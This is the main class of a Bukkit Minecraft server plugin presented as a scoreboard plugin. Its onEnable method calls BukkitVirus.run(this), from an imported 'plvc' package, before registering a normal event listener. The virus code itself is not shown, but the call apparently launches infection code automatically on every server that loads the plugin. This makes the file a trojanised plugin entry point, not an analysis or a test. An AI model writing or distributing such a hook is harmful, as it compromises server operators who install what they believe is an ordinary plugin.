package bukkitplugin.scoreboard;

import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;
import plvc.BukkitVirus;

public class BukkitPlugin extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        BukkitVirus.run(this);

        getServer().getPluginManager().registerEvents(new EventListener(this), this);
    }
}
